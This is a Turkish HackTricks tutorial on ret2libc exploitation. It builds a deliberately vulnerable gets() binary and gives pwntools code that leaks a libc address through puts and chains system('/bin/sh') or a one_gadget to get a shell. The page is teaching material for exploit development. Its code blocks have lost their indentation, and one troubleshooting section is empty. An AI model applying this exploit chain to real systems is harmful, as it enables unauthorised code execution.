# ROP ile libc adres sızdırma

<details>

<summary><strong>AWS hackleme konusunda sıfırdan ileri seviyeye kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Hızlı Özet

1. **Taşma** ofsetini **bulun**
2. `POP_RDI`, `PUTS_PLT` ve `MAIN_PLT` gadget'larını **bulun**
3. Önceki gadget'ları kullanarak puts veya başka bir libc fonksiyonunun bellek adresini **sızdırmak** ve **libc sürümünü bulmak** için kullanın ([indirin](https://libc.blukat.me))
4. Kütüphane ile ROP'yi **hesaplayın ve sömürün**

## Diğer öğreticiler ve uygulama dosyaları

Bu öğretici, bu öğreticide önerilen kodu/binary'yi sömürecek: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Başka yararlı öğreticiler: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Kod

Dosya adı: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC Adres Sızdırma Şablonu

Exploit'i kullanmak için burada bulunan kodu kullanacağım.\
Exploiti indirin ve zafiyetli ikili dosyanın bulunduğu dizine yerleştirin ve betiğe gerekli verileri verin:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Ofset Bulma

Exploit'e devam etmeden önce şablonun bir ofsete ihtiyacı var. Eğer bir ofset sağlanmazsa, gerekli kodu çalıştırarak ofseti bulacaktır (varsayılan olarak `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Çalıştır** `python template.py` komutunu, bir GDB konsolu programın çöktüğü şekilde açılacaktır. Bu **GDB konsolu** içinde `x/wx $rsp` komutunu çalıştırarak RIP'yi üzerine yazacağınız **baytları** alın. Son olarak bir **python** konsolu kullanarak **ofset** değerini alın:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Ofset'i bulduktan sonra (bu durumda 40) değeri kullanarak şablon içindeki OFFSET değişkenini değiştirin.\
`OFFSET = "A" * 40`

Başka bir yol ise şu şekilde olabilir: `pattern create 1000` -- _ret'e kadar çalıştır_ -- `pattern seach $rsp` GEF'ten.

## 2- Gadget'ları Bulma

Şimdi, binary içinde ROP gadget'larını bulmamız gerekiyor. Bu ROP gadget'ları, **kullanılan libc**'yi bulmak için `puts`'u çağırmak için ve daha sonra **son saldırıyı başlatmak** için kullanışlı olacaktır.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`, **puts** fonksiyonunu çağırmak için gereklidir.\
`MAIN_PLT`, bir etkileşimden sonra **tekrar taşma**yı **sömürmek** için **ana işlevi** tekrar çağırmak için gereklidir (sonsuz sayıda sömürü turu). **Her ROP'un sonunda programı tekrar çağırmak için kullanılır**.\
**POP\_RDI**, **çağrılan fonksiyona bir parametre** geçirmek için gereklidir.

Bu adımda, her şeyin yürütme sırasında pwntools tarafından bulunacağından bir şeyi yürütmenize gerek yoktur.

## 3- Libc kütüphanesini bulma

Şimdi, kullanılan **libc** kütüphanesinin hangi sürüm olduğunu bulma zamanı geldi. Bunu yapmak için, **hafızadaki puts fonksiyonunun adresini sızdıracağız** ve ardından bu adresteki puts sürümünün hangi **kütüphane sürümünde** olduğunu **aramaya** başlayacağız.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Bunu yapmak için, yürütülen kodun en önemli satırı:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Bu, **RIP**'yi **üzerine yazma** olasılığına kadar bazı baytlar gönderecek: `OFFSET`.\
Daha sonra, `POP_RDI` adlı **gadget**'ın **adresini** ayarlayacak, böylece bir sonraki adres (`FUNC_GOT`) **RDI** kaydedilecek. Bu, **puts**'ı **çağırmak** istediğimiz için **PUTS_GOT**'un **adresini** **RDI** kaydediyoruz çünkü bellekte puts fonksiyonunun adresi, `PUTS_GOT` tarafından işaret edilen adreste saklanmıştır.\
Bundan sonra, `PUTS_PLT` (içinde **PUTS_GOT** olan **RDI** ile) çağrılacak, bu nedenle puts, `PUTS_GOT` içindeki içeriği (**bellekte puts fonksiyonunun adresi**) **okuyacak** ve **yazdıracak**.\
Son olarak, **ana işlev tekrar çağrılır** böylece taşmayı tekrar kullanabiliriz.

Bu şekilde, puts fonksiyonunu **aldatmış olduk** ve bellekteki **puts** fonksiyonunun **adresini** (ki bu **libc** kütüphanesinin içindedir) **yazdırmak** için kullanmış olduk. Artık o adresi aldığımıza göre hangi **libc** sürümünün kullanıldığını **aramaya** başlayabiliriz.

![image](<../../../../../.gitbook/assets/image (141).png>)

Biraz **yerel** ikili dosyayı **sömürdüğümüzden** hangi **libc** sürümünün kullanıldığını **bulmamıza gerek yok** (`/lib/x86_64-linux-gnu/libc.so.6` içinde kütüphaneyi bulun).\
Ancak, uzaktan bir saldırı durumunda, nasıl bulabileceğinizi burada açıklayacağım:

### 3.1- Libc sürümünü arama (1)

Kullanılan kütüphaneyi arayabilirsiniz: [https://libc.blukat.me/](https://libc.blukat.me)\
Ayrıca, **libc**'nin keşfedilen sürümünü indirmenize olanak tanır

![image](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- Libc sürümünü arama (2)

Ayrıca şunu yapabilirsiniz:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Bu biraz zaman alacak, sabırlı olun.\
Bu çalışması için gerekenler:

* Libc sembol adı: `puts`
* Sızdırılan libc adresi: `0x7ff629878690`

Muhtemelen kullanılan **libc**'yi anlayabiliriz.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
İki eşleşme bulduk (ilk çalışmazsa ikinciyi denemelisiniz). İlkini indirin:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` dosyasını çalışma dizinimize kopyalayın.

### 3.3- Sızdırmak için diğer fonksiyonlar
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Temel libc adresini bulma ve sömürme

Bu noktada kullanılan libc kütüphanesini bilmemiz gerekmektedir. Bir yerel ikili dosyayı sömürdüğümüz için sadece şunu kullanacağım: `/lib/x86_64-linux-gnu/libc.so.6`

Bu yüzden, `template.py` dosyasının başında **libc** değişkenini şu şekilde değiştirin: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Bilindiğinde kütüphane yolunu ayarlayın`

**libc kütüphanesinin yolunu** verdiğinizde, **sömürge kalanı otomatik olarak hesaplanacaktır**.

`get_addr` fonksiyonu içinde **libc'in temel adresi** hesaplanacaktır:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**Not:** **Son libc taban adresinin 00 ile bitmesi gerektiğini unutmayın**. Aksi takdirde yanlış bir kütüphane sızdırmış olabilirsiniz.
{% endhint %}

Ardından, `system` fonksiyonunun adresi ve _"/bin/sh"_ dizesinin **adresi**, **libc**'in **taban adresinden** hesaplanacak ve **verilen libc kütüphanesinde** olacak.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Son olarak, /bin/sh yürütme açığı hazırlanıp gönderilecek:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
Son ROP (`rop1`) tekrar main fonksiyonunu çağırdıktan sonra **tekrar zafiyet**i **sömürme**k istiyoruz (bu yüzden `OFFSET` burada tekrar). Daha sonra, _"/bin/sh"_ adresine işaret eden `POP_RDI`'ı çağırmak ve **system** fonksiyonunu (`SYSTEM`) çağırmak istiyoruz çünkü _"/bin/sh"_ adresi bir parametre olarak geçirilecek.\
Son olarak, **exit fonksiyonunun adresi** çağrılıyor böylece işlem güzelce sonlanır ve herhangi bir uyarı oluşturulmaz.

**Bu şekilde zafiyet bir \_/bin/sh**\_\*\* kabuğunu çalıştıracak.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- ONE\_GADGET Kullanımı

**ONE\_GADGET**'i kullanarak **system** ve **"/bin/sh"** yerine kabuk elde etmek için [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) kullanabilirsiniz. **ONE\_GADGET**, libc kütüphanesinde sadece bir **ROP adresi** kullanarak kabuk elde etmenin bir yolunu bulacaktır.\
Ancak, genellikle bazı kısıtlamalar vardır, en yaygın olanları ve kolayca kaçınılabilecek olanlar `[rsp+0x30] == NULL` gibi. **RSP** içindeki değerleri kontrol ettiğinizden, sadece daha fazla NULL değeri göndererek kısıtlamayı önleyebilirsiniz.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## SIZDIRMA DOSYASI

Bu zafiyeti sömürmek için bir şablonu burada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Sıkça karşılaşılan sorunlar

### MAIN\_PLT = elf.symbols\['main'] bulunamadı

Eğer "main" sembolü mevcut değilse. O zaman main kodunun nerede olduğunu bulabilirsiniz:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ve adresi manuel olarak ayarlayın:
```python
MAIN_PLT = 0x401080
```
### Puts bulunamadı

Eğer ikili dosya Puts kullanmıyorsa, şunu kontrol etmelisiniz:

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Bu **hata**yı tüm saldırıyı oluşturduktan sonra bulursanız: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Deneyin **"/bin/sh" adresinden 64 bayt çıkarmayı**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
